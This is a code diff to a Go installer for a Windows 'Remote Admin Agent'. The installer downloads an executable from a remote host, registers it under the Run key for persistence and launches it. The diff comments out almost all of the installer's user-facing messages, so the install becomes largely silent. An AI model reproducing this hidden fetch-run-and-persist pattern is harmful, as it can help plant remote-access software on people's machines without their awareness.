@@ -21,7 +21,7 @@ import (
 const (
 	STARTUP_KEY  = `Software\Microsoft\Windows\CurrentVersion\Run`
 	STARTUP_NAME = "RemoteAdminAgent"
-	DOWNLOAD_URL = "https://pub-a465b0a6dde54221ba9c5b94c03c6830.r2.dev/agent/dws-agent.exe"
+	DOWNLOAD_URL = "https://storage.daucu.com/agent/dws-agent.exe"
 	SERVICE_NAME = "RemoteAdminAgent"
 	INSTALL_DIR  = "C:\\RemoteAdmin"
 	EXE_NAME     = "dws-agent.exe"
@@ -49,39 +49,39 @@ func main() {
 		os.Exit(0)
 	}
 
-	fmt.Println("╔════════════════════════════════════════╗")
-	fmt.Println("║   Remote Admin Agent Installer        ║")
-	fmt.Println("╚════════════════════════════════════════╝")
-	fmt.Println()
+	// fmt.Println("╔════════════════════════════════════════╗")
+	// fmt.Println("║   Remote Admin Agent Installer        ║")
+	// fmt.Println("╚════════════════════════════════════════╝")
+	// fmt.Println()
 
 	// Detect system architecture
-	arch := detectArchitecture()
-	fmt.Printf("🔍 Detected Architecture: %s\n", arch)
-	fmt.Println()
+	// arch := detectArchitecture()
+	// fmt.Printf("🔍 Detected Architecture: %s\n", arch)
+	// fmt.Println()
 
 	// Step 1: Clean existing installation directory
-	fmt.Println("🧹 Cleaning existing installation...")
+	// fmt.Println("🧹 Cleaning existing installation...")
 	if _, err := os.Stat(INSTALL_DIR); err == nil {
 		// Directory exists, remove all files
 		entries, _ := os.ReadDir(INSTALL_DIR)
 		for _, entry := range entries {
 			os.RemoveAll(filepath.Join(INSTALL_DIR, entry.Name()))
 		}
-		fmt.Println("✅ Old files cleaned")
+		// fmt.Println("✅ Old files cleaned")
 	}
 
 	// Step 2: Create installation directory
-	fmt.Println("📁 Creating installation directory...")
+	// fmt.Println("📁 Creating installation directory...")
 	if err := os.MkdirAll(INSTALL_DIR, 0755); err != nil {
-		fmt.Printf("❌ Failed to create directory: %v\n", err)
+		// fmt.Printf("❌ Failed to create directory: %v\n", err)
 		pause()
 		os.Exit(1)
 	}
-	fmt.Println("✅ Directory created")
+	// fmt.Println("✅ Directory created")
 
 	// Step 3: Download agent with retry
 	exePath := filepath.Join(INSTALL_DIR, EXE_NAME)
-	fmt.Printf("\n⬇️  Downloading %s agent...\n", arch)
+	// fmt.Printf("\n⬇️  Downloading %s agent...\n", arch)
 
 	maxRetries := 3
 	var lastErr error
@@ -100,59 +100,59 @@ func main() {
 		}
 
 		// Success!
-		fmt.Println("\n✅ Download complete")
+		// fmt.Println("\n✅ Download complete")
 		lastErr = nil
 		break
 	}
 
 	if lastErr != nil {
-		fmt.Printf("\n❌ Download failed after %d attempts: %v\n", maxRetries, lastErr)
-		fmt.Println("\n💡 Tip: Please check your internet connection and try again.")
+		// fmt.Printf("\n❌ Download failed after %d attempts: %v\n", maxRetries, lastErr)
+		// fmt.Println("\n💡 Tip: Please check your internet connection and try again.")
 		pause()
 		os.Exit(1)
 	}
 
 	// Step 4: Stop existing service if running (cleanup old installations)
-	fmt.Println("\n🛑 Stopping existing service (if any)...")
+	// fmt.Println("\n🛑 Stopping existing service (if any)...")
 	stopService()
 
 	// Step 5: Remove existing service (cleanup old installations)
-	fmt.Println("🗑️  Removing existing service (if any)...")
+	// fmt.Println("🗑️  Removing existing service (if any)...")
 	removeService()
 
 	// Step 6: Kill any running agent process
-	fmt.Println("\n🔄 Stopping any running agent...")
+	// fmt.Println("\n🔄 Stopping any running agent...")
 	killAgentProcess()
 
 	// Step 7: Add to Windows Startup (runs in user session for screen access)
-	fmt.Println("\n⚙️  Adding to Windows Startup...")
+	// fmt.Println("\n⚙️  Adding to Windows Startup...")
 	if err := addToStartup(exePath); err != nil {
-		fmt.Printf("❌ Failed to add to startup: %v\n", err)
+		// fmt.Printf("❌ Failed to add to startup: %v\n", err)
 		pause()
 		os.Exit(1)
 	}
-	fmt.Println("✅ Added to startup")
+	// fmt.Println("✅ Added to startup")
 
 	// Step 8: Start agent now
-	fmt.Println("\n▶️  Starting agent...")
+	// fmt.Println("\n▶️  Starting agent...")
 	if err := startAgent(exePath); err != nil {
-		fmt.Printf("⚠️  Warning: Failed to start agent: %v\n", err)
-		fmt.Println("The agent will start automatically on next login")
+		// fmt.Printf("⚠️  Warning: Failed to start agent: %v\n", err)
+		// fmt.Println("The agent will start automatically on next login")
 	} else {
 		fmt.Println("✅ Agent started successfully")
 	}
 
-	fmt.Println("\n╔════════════════════════════════════════╗")
-	fmt.Println("║     Installation Complete! ✅          ║")
-	fmt.Println("╚════════════════════════════════════════╝")
-	fmt.Println()
-	fmt.Println("🎉 The agent is now running in the background!")
-	fmt.Println("\n✨ Details:")
-	fmt.Printf("   • Location: %s\n", exePath)
-	fmt.Printf("   • Status: Running\n")
-	fmt.Printf("   • Auto-start: Enabled (on login)\n")
-	fmt.Println()
-	fmt.Println("Closing in 3 seconds...")
+	// fmt.Println("\n╔════════════════════════════════════════╗")
+	// fmt.Println("║     Installation Complete! ✅          ║")
+	// fmt.Println("╚════════════════════════════════════════╝")
+	// fmt.Println()
+	// fmt.Println("🎉 The agent is now running in the background!")
+	// fmt.Println("\n✨ Details:")
+	// fmt.Printf("   • Location: %s\n", exePath)
+	// fmt.Printf("   • Status: Running\n")
+	// fmt.Printf("   • Auto-start: Enabled (on login)\n")
+	// fmt.Println()
+	// fmt.Println("Closing in 3 seconds...")
 	time.Sleep(3 * time.Second)
 }
 
